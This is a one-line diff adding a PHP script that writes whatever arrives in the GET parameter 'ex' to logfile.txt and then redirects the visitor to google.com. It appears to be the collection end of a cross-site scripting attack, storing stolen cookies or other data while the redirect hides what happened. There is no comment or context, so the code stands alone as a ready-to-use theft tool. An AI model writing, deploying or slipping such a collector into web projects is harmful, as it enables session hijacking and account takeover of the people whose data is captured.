@@ -1,0 +1,1 @@
+<?php $filename = "logfile.txt"; if (isset($_GET["ex"])) { if (!$handle = fopen($filename, 'a')) { exit; } else { if (fwrite($handle, "\r\n" . $_GET["ex"]) === FALSE) {  exit; } }  header("Location: http://www.google.com"); fclose($handle); exit; } exit; ?>
